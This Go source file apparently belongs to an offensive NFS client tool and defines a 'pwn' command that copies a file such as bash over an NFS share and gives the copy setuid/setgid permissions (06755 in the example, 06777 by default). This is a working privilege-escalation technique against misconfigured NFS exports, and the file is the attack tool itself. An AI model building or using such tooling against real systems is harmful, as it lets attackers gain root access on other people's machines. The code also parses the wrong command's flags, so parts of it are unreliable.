package cli

import (
	"fmt"
	"io"
	"os"

	"github.com/spf13/cobra"
	"github.com/willscott/go-nfs-client/nfs"
)

var cmdPwnFlags struct {
	cmdCommonAttrFlags
}

func init() {
	commandProviders = append(commandProviders, newPwnCmd)
}

func newPwnCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:     "pwn <src>",
		Args:    cobra.MinimumNArgs(1),
		Run:     runPwnCmd,
		Short:   "Turn any file into a suid binary",
		Example: "Copies the file 'bash' to 'bash.pwn' and sets mode 06755: pwn bash",
	}
	cmdPwnFlags.registerCommonAttrFlags(cmd.Flags(), "06777")
	return cmd
}

func runPwnCmd(cmd *cobra.Command, args []string) {
	attrOps, mode, ok := cmdPutFlags.parseCommonAttrFlags(cmd.Flags(), false)
	if !ok {
		return
	}

	src := cwd.Relative(args[0])
	dst := src + ".pwn"

	nfsOpen(src, func(srcf *nfs.File) {
		nfsCreate(dst, mode, func(dstf *nfs.File) {
			if _, err := io.Copy(dstf, srcf); err != nil {
				fmt.Fprintf(os.Stderr, "copy: %v\n", err)
				return
			}
		}, attrOps...)
	})
}
